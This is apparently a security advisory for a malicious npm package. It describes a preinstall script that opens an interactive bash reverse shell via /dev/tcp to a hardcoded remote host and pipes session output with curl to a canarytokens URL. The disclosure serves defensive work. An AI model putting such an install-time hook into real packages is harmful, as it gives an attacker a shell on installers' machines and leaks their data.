summary: preinstall reverse shell to 147.93.157.202:8080 with canarytokens beacon
details: package.json declares a preinstall lifecycle script that runs `bash -i` with a /dev/tcp redirection to the hardcoded remote host 147.93.157.202 on port 8080, giving the operator of that host an interactive shell on the installer's machine at `npm install` time. The same preinstall pipes shell session output via `curl -s -m 5 -X POST --data-binary @- http://canarytokens.com/terms/<token>/contact.php`, causing an install-time callback over plain HTTP carrying installer host data to a third-party tracker. The package description self-labels as an 'Authorized report' referencing a wearehackerone.com contact, but the shipped preinstall payload is a live reverse shell that executes against any installer regardless of that framing.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
